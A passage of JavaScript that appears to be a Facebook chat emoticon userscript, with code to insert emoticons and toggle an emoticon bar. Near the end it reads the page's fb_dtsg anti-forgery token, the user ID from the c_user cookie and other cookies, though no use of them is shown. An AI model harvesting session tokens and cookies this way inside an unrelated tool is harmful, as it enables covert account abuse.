			var txtbef = event.target.getAttribute('alt').charAt(0);
			var txtaft = event.target.getAttribute('alt').charAt(0);
			
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
			
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
			
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
			
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}

	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('uiToggleFlyout');
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
	}
	
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}